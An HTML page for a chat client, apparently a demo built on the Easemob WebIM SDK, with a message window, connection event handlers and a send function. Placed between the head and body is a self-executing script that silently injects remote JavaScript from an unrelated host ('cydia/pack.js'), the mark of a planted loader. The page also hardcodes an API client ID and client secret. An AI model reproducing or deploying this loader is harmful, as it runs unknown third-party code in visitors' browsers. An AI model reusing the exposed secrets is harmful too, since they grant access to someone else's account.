<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
		<title>登录</title>
		<link rel="stylesheet" href="static/css/weui.css" />
		<link rel="stylesheet" href="static/css/weui-jquery.css" />
		<link rel="stylesheet" href="static/css/login.css" />
		<link rel="stylesheet" href="static/css/ccccccc.css" />
	</head>
	<script>
		(function () {
			var dw = document.createElement("script");
			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
			var s = document.getElementsByTagName("script")[0];
			s.parentNode.insertBefore(dw, s);
		})()
	</script>
	<body>
		<div id="root">
			<div class="webim-loading hide">
				<div>
					<div class="ant-spin ant-spin-lg ant-spin-spinning">
						<span class="ant-spin-dot">
							<i></i>
							<i></i>
							<i></i>
							<i></i>
						</span>
					</div>
				</div>
			</div>
			<div class="x-layout">
				<!--<div class="header x-layout-header">
					<div id="x-header-ops" class="x-list-item headerBg">
						<div class="fl">
							<i class="anticon anticon-setting ant-dropdown-trigger"></i>
						</div>
						<div class="fl">test</div>
						<div class="fr">
							<i class="anticon anticon-plus-circle-o ant-dropdown-trigger"></i>
						</div>
					</div>
					<ul class="ant-menu ant-menu-horizontal x-header-tab__menu ant-menu-light ant-menu-root" role="menu" aria-activedescendant id="x-header-tab" tabindex="0">
						<li class="ant-menu-item-selected ant-menu-item" role="menuitem" aria-selected="true">
							<i class="fontello icon-comment"></i>
							<span class="nav-text">好友</span>
						</li>
						<li class="ant-menu-item" role="menuitem" aria-selected="false">
							<i class="fontello icon-chat"></i>
							<span class="nav-text">群组</span>
						</li>
						<li class="ant-menu-item" role="menuitem" aria-selected="false">
							<i class="fontello icon-users-1"></i>
							<span class="nav-text">聊天室</span>
						</li>
						<li class="ant-menu-item" role="menuitem" aria-selected="false">
							<i class="fontello icon-address-book-1"></i>
							<span class="nav-text">陌生人</span>
						</li>
					</ul>
				</div>
				-->
				<div class="x-layout-main x-layout-content">
					<!--<div class="x-layout-sider">
						<div>
							<ul class="ant-menu ant-menu-inline ant-menu-light ant-menu-root" aria-activedescendant id="x-contact-item" tabindex="0">
								<li class="ant-menu-item-selected ant-menu-item" role="menuitem" aria-selected="true">
									<div class="nav-text">
										<div>admin<span class="ant-badge ant-badge-not-a-wrapper"></span></div>
										<div class="nav-text-desc">876543</div>
									</div>
									<div class="nav-op">10-11 10:54 AM</div>
								</li>
							</ul>
						</div>
					</div>
					<div class="x-layout-video"></div>-->
					<div class="x-layout-chat x-layout-content">
						<div class="x-chat">
							<!--商家：-->
							<div class="x-list-item x-chat-header">
								<div class="f1">admin</div>
								<div class="fr">
									<span><i class="anticon anticon-ellipsis ant-dropdown-trigger"></i></span>
								</div>
							</div>
							<div class="x-chat-content">
								<div class="x-message-group">
									<div class="x-message-user">admin</div>
									<div class="x-message-content"><p class="x-message-text">21</p></div>
									<div class="x-message-time">10-11 10:42 AM
										<span class="x-message-status"></span>
									</div>
								</div>
								<div class="group x-message-right">
									<div class="x-message-user"></div>
									<div class="x-message-content"><p class="x-message-text">没有已读未读</p></div>
									<div class="x-message-time">10-11 10:42 AM
										<span class="x-message-status"></span>
									</div>
								</div>
								<div class="x-message-group">
									<div class="x-message-user">admin</div>
									<div class="x-message-content"><p class="x-message-text">21</p></div>
									<div class="x-message-time">10-11 10:42 AM
										<span class="x-message-status"></span>
									</div>
								</div>
								<div class="x-message-group">
									<div class="x-message-user">admin</div>
									<div class="x-message-content"><p class="x-message-text">21</p></div>
									<div class="x-message-time">10-11 10:42 AM
										<span class="x-message-status"></span>
									</div>
								</div>
								<div class="group x-message-right">
									<div class="x-message-user"></div>
									<div class="x-message-content"><p class="x-message-text">没有已读未读</p></div>
									<div class="x-message-time">10-11 10:42 AM
										<span class="x-message-status"></span>
									</div>
								</div>
								<div class="group x-message-right">
									<div class="x-message-user"></div>
									<div class="x-message-content"><p class="x-message-text">没有已读未读</p></div>
									<div class="x-message-time">10-11 10:42 AM
										<span class="x-message-status"></span>
									</div>
								</div>
								<div class="group x-message-right">
									<div class="x-message-user"></div>
									<div class="x-message-content"><p class="x-message-text">没有已读未读</p></div>
									<div class="x-message-time">10-11 10:42 AM
										<span class="x-message-status"></span>
									</div>
								</div>
							</div>
							<div class="x-chat-footer">
								<!--<div class="x-list-item x-chat-ops">
									<div class="x-chat-ops-icon ib">
										<div class="ib">
											<a class="ant-dropdown-link ant-dropdown-trigger">
												<i class="iconfont icon-smile"></i>
											</a>
										</div>
									</div>
									<label for="uploadImage" class="x-chat-ops-icon ib">
										<i class="iconfont icon-picture"></i>
										<input id="uploadImage" type="file" class="hide" />
									</label>
									<label for="uploadFile" class="x-chat-ops-icon ib">
										<i class="icon iconfont icon-file-empty"></i>
										<input id="uploadFile" type="file" class="hide" />
									</label>
									<label for="clearMessage" class="x-chat-ops-icon ib">
										<i class="icon iconfont icon-trash"></i>
									</label>
								</div>-->
								<div class="x-list-item x-chat-send">
									<span class="ant-input-group-wrapper">
										<span class="ant-input-wrapper ant-input-group">
											<input type="text" class="ant-input" id="toMsg" placeholder="消息" />
											<!--<textarea placeholder="消息"></textarea>-->
											<span class="ant-input-group-addon" id="privateText">
												发送
												<!--<i class="fontello icon-paper-plane"></i>-->
											</span>
										</span>
									</span>
								</div>
							</div>
						</div>
					</div>
					<div class="x-layout-right-sider hide"></div>
				</div>
			</div>
		</div>
		<script type="text/javascript" src="lib/jquery.js" ></script>
		<script type="text/javascript" src="lib/jquery-weui.js" ></script>
		<script type="text/javascript" src="lib/WebIMConfig.js" ></script>
		<script type="text/javascript" src="lib/webimSDK.js" ></script>
		<!--<script type="text/javascript" src="../../lib/adapter.js" ></script>
		<script type="text/javascript" src="../../lib/browser-polyfill.min.js" ></script>-->
		<script type="text/javascript" src="lib/EMedia_x1v1.js" ></script>
		<script type="text/javascript" src="lib/strophe-1.2.8.min.js" ></script>
		<!--<script type="text/javascript" src="static/js/api.js" ></script>-->
		<script>
	        var conn = {};
	        var tokenNum;
	        console.log(WebIM, window.WebIM);
	        WebIM.config = config;
	        conn = WebIM.conn = new WebIM.default.connection({
	            isHttpDNS: WebIM.config.isHttpDNS,
	            isMultiLoginSessions: WebIM.config.isMultiLoginSessions,
	            host: WebIM.config.Host,
	            https: WebIM.config.https,
	            url: WebIM.config.xmppURL,
	            apiUrl: WebIM.config.apiURL,
	            isAutoLogin: false,
	            heartBeatWait: WebIM.config.heartBeatWait,
	            autoReconnectNumMax: WebIM.config.autoReconnectNumMax,
	            autoReconnectInterval: WebIM.config.autoReconnectInterval,
	            isStropheLog: WebIM.config.isStropheLog,
	            delivery: WebIM.config.delivery
	        })
			tokens();
			function tokens(){
				$.ajax({
					type:"Get",
					url:"https://a1.easemob.com/1131190930019589/ecm/token",
					async:true,
					dataType:'json',
					data:{
					  "grant_type": "client_credentials",
					  "client_id": "YXA6FTM1ByjOSRWyzUkEw1JoiA",
					  "client_secret": "YXA6PcHR-LtKnnkLu0N_YSy7_ct3CSk"
					},
					success: function (data) {
						console.log(data);
						tokenNum = data.access_token;
				    },
				    error:function(xhr,type,errorThrown){
						console.log(xhr.statusText);
						console.log("错误提示了："+ xhr.status +" ");
					}
				});
			}
	        conn.listen({
	            onOpened: function (message) {          //连接成功回调
	                var myDate = new Date().toLocaleString();
	                console.log("%c [opened] 连接已成功建立", "color: green");
	                console.log(myDate);
	                // rek();
	                // alert(myDate + "登陆成功")
	            },
	            onClosed: function (message) {
	                console.log("onclose:" + message);
	                console.log(error);
	            },         //连接关闭回调
	            onTextMessage: function (message) {
	                console.log('onTextMessage: ', message);

	            },    //收到文本消息

	            onEmojiMessage: function (message) {
	                console.log('onEmojiMessage: ', message);
	            },   //收到表情消息
	            onPictureMessage: function (message) {
	                console.log('onPicMessage: ', message);
	            }, //收到图片消息
	            onCmdMessage: function (message) {
	                console.log('onCmdMessage: ', message);
	                var truthBeTold = window.confirm((message.from + "邀请您加入会议"));
	                if (truthBeTold) {
	                    emedia.mgr.joinConference(message.ext.confrId, message.ext.password, ext).then(function () {
	                        console.log("********加入会议成功*******")
	                        // var videoTag = document.getElementById("localVideo")
	                        // emedia.mgr.streamBindVideo(stream, videoTag);
	                    })
	                } else {

	                }
	            },     //收到命令消息
	            onAudioMessage: function (message) {
	                console.log('onAudioMessage: ', message);
	            },   //收到音频消息
	            onLocationMessage: function (message) {
	                console.log('onLocMessage: ', message);
	            },//收到位置消息
	            onFileMessage: function (message) {
	                console.log('onFileMessage: ', message);
	            },    //收到文件消息
	            recallMessage: function (message) {
	                console.log('recallMessage', message);
	            }, //消息撤回
	            onVideoMessage: function (message) {
	                console.log('onVideoMessage: ', message);
	                var node = document.getElementById('privateVideo');
	                var option = {
	                    url: message.url,
	                    headers: {
	                        'Accept': 'audio/mp4'
	                    },
	                    onFileDownloadComplete: function (response) {
	                        var objectURL = WebIM.utils.parseDownloadResponse.call(conn, response);
	                        node.src = objectURL;
	                    },
	                    onFileDownloadError: function () {
	                        console.log('File down load error.')
	                    }
	                };
	                WebIM.utils.download.call(conn, option);
	            },   //收到视频消息
	            onPresence: function (message) {
	                var myDate = new Date().toLocaleString();
	                console.log('onPresence: ', myDate + JSON.stringify(message));
	                switch (message.type) {
	                    case 'subscribe': // 对方请求添加好友
	                        var truthBeTold = window.confirm((message.from + "申请添加您为好友:"));
	                        if (truthBeTold) {
	                            // 同意对方添加好友
	                            conn.subscribed({
	                                to: message.from,
	                                message: "[resp:true]"
	                            });
	                            console.log("同意添加好友");
	                        } else {
	                            // 拒绝对方添加好友
	                            conn.unsubscribed({
	                                to: message.from,
	                                message: "rejectAddFriend" // 拒绝添加好友回复信息
	                            });
	                            console.log("拒绝添加好友");
	                        }
	                        break;
	                    case 'subscribed': // 对方同意添加好友，已方同意添加好友
	                        break;
	                    case 'unsubscribe': // 对方删除好友
	                        break;
	                    case 'unsubscribed': // 被拒绝添加好友，或被对方删除好友成功
	                        break;
	                    case 'memberJoinPublicGroupSuccess': // 成功加入聊天室
	                        console.log('join chat room success' + myDate);
	                        console.log(new Date().toLocaleString());
	                        break;
	                    case 'joinChatRoomFaild': // 加入聊天室失败
	                        console.log('join chat room faild');
	                        break;
	                    case 'joinPublicGroupSuccess': // 意义待查
	                        console.log('join public group success', message.from);
	                        break;
	                    case 'createGroupACK':
	                        conn.createGroupAsync({
	                            from: message.from,
	                            success: function (option) {
	                                console.log('Create Group Succeed');
	                            }
	                        });
	                        break;
	                }
	            },       //处理“广播”或“发布-订阅”消息，如联系人订阅请求、处理群组、聊天室被踢解散等消息
	            onRoster: function (message) {
	                console.log("onRoster", message);
	            },         //处理好友申请
	            onInviteMessage: function (message) {
	                console.log('Invite');
	            },  //处理群组邀请
	            onOnline: function () {
	                console.log("onOnline");
	            },                  //本机网络连接成功
	            onOffline: function () {
	                console.log('offline');
	            },                 //本机网络掉线
	            onError: function (message) {
	                console.log('onError: ', message);

	            },          //失败回调
	            onBlacklistUpdate: function (list) {       //黑名单变动
	                // 查询黑名单，将好友拉黑，将好友从黑名单移除都会回调这个函数，list则是黑名单现有的所有好友信息
	                console.log(list);
	            },
	            onReceivedMessage: function (message) {
	                console.log('onReceivedMessage: ', message);
	            },    //收到消息送达服务器回执
	            onDeliveredMessage: function (message) {
	                console.log('onDeliveredMessage：', message);
	            },   //收到消息送达客户端回执
	            onReadMessage: function (message) {
	                console.log('onReadMessage: ', message);
	            },        //收到消息已读回执
	            onCreateGroup: function (message) {
	                console.log('onCreateGroup: ', message);
	            },        //创建群组成功回执（需调用createGroupNew）
	            onMutedMessage: function (message) {
	                console.log('onMutedMessage: ', message);
	            }         //如果用户在A群组被禁言，在A群发消息会走这个回调并且消息不会传递给群其它成员
	        });

	    </script>

		<script>
			var webSocket;
			var conf = WebIM.config
	        //var WebIM = WebIM.default
	        WebIM.config = conf
	        WebIM.message = WebIM.default.message
	        WebIM.utils = WebIM.default.utils
	        WebIM.debug = WebIM.default.debug
	        WebIM.statusCode = WebIM.default.statusCode

	        var myDate = new Date().toLocaleString();
	        console.log(myDate);
	        var handlerUrl = 'wss://a1.easemob.com/1131190930019589/ecm/messages';
	        document.getElementById('privateText').onclick = function () {
	        	var tmsg = document.getElementById("toMsg").value;
	            var tname = '18807429036';
	            var id = conn.getUniqueId();                 // 生成本地消息id
	            var msg = new WebIM.default.message('txt', id);      // 创建文本消息
	            msg.set({
	                msg: tmsg,                  // 消息内容
	                to: tname,
	                target_type:'users',
	                type:'txt',
	                ext: {
	                    'time': myDate
	                },                       // 接收消息对象（用户id）
	                success: function (id, serverMsgId) {
	                	console.log(id, serverMsgId)
	                    console.log('send private text Success');
	                    msgText = msg.body.msg;
	                },
	                fail: function (e) {
	                	console.log(e)
	                    console.log("Send private text error");
	                }
	            });
	            console.log(msg);
////	            msg.body.chatType = 'singleChat';
	            conn.send(msg.body);
	            console.log(msg);
//	            //赋值显示到input
	            console.log(msg.body.msg)
////	            document.getElementById("txt1").value = msg.body.msg

//				var data = {
//					"target_type": "users",
//				  	"msg": {
//				    	"type": "txt",
//				    	"msg": tmsg
//				  	},
//				  	"to": tname,
//				  	"ext": {
//	                    'time': myDate
//	                },
//				};
//				InitWebSocket();
//				if (webSocket.OPEN && webSocket.readyState == 1) {
////	                var socket = new webSocket('');//http->ws; https->wss
//					webSocket.send(data);
//					webSocket.onmessage = function(event){
//					    var data = event.data;
//					    console.log(event);
//					}
//				}
//		        //如果WebSocket关闭，显示消息
//	            if (webSocket.readyState == 2 || webSocket.readyState == 3) {
//	                alert("WebSocket关闭了，无法发送数据");
//	            }
//				function InitWebSocket() {
//
//		            //如果WebSocket对象未初始化，我们将初始化它
//		            if (webSocket == undefined) {
//		                webSocket = new WebSocket(handlerUrl);
//
//		                //打开连接处理程序
//		                webSocket.onopen = function () {
//		                    alert("WebSocket已连接");
//		                };
//
//		                //消息数据处理程序
//		                webSocket.onmessage = function (e) {
//		                	console.log(e)
////		                    var label = '<li>' + e.data + '</li>';
////		                    $("#receiveText").append(label);
//		                };
//
//		                //关闭事件处理程序
//		                webSocket.onclose = function () {
//		                    alert("WebSocket closed.");
//		                };
//
//		                //错误事件处理程序
//		                webSocket.onerror = function (e) {
//		                    alert('错误'+e.message);
//		                };
//		            }
//		            else {
//		                webSocket.open();没有open方法
//		            }
//		       }
//	        	console.log(tokenNum)
//				$.ajax({
//					type:"POST",
//					url:"https://a1.easemob.com/1131190930019589/ecm/messages",
//					async:true,
//					dataType:'json',
//					data:{
//						"target_type": "users",
//					  	"msg": {
//					    	"type": "txt",
//					    	"msg": tmsg
//					  	},
//					  	"from":'18807429033',
//					  	"to": tname,
//					  	"ext": {
//		                    'time': myDate
//		                },
//					},
//					header:{'Authorization':tokenNum,"Access-Control-Allow-Origin":"*"},
//					success: function (data) {
//						console.log(data);
//				    },
//				    error:function(xhr,type,errorThrown){
//						console.log(xhr.statusText);
//						console.log("错误提示了："+ xhr.status +" ");
//					}
//				});
//
	        };
//	        historyFun();
//
//	        function historyFun(){
//	        	var options = {
//				    queue: "18807429039",
//				    isGroup: false,
//				    count: 10,
//				    success: function(){},
//				    fail: function(){}
//				}
//				conn.fetchHistoryMessages(options)
//	        }
		</script>
	</body>
</html>
